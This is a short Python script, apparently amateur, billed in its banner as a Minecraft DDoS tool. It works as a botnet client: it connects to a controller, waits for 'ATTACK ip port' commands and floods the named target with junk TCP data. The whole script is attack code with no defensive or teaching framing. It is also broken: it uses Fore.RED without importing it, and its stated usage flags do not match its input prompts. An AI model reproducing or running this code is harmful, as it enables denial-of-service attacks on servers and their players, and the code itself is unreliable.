import socket
import threading

print(Fore.RED + """
  /\\_/\\
 ( o.o )
  > ^ <

Hacking The DDoS Minecraft Soon By Angel
Github: Angel + Make Angel Dev Soon
How to use ddos Minecraft Use -ip ip Server -p Port Server
""")


def client_handler(server_ip, server_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            print("Connected to the server.")

            # الاستماع للأوامر من الخادم الرئيسي
            while True:
                data = s.recv(1024).decode('utf-8')
                if data.startswith("ATTACK"):
                    _, ip, port = data.split()
                    print(f"Attacking {ip}:{port}")
                    send_request(ip, int(port))

    except Exception as e:
        print(f"An error occurred: {e}")

def send_request(ip, port, count=1000, delay=0):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            for i in range(count):
                s.sendall(b'\xFF\xFF\xFF\xFF')
    except Exception as e:
        print(f"An error occurred during the attack: {e}")

if __name__ == "__main__":
    server_ip = input("Enter the server IP: ")
    server_port = int(input("Enter the server port: "))
    client_handler(server_ip, server_port)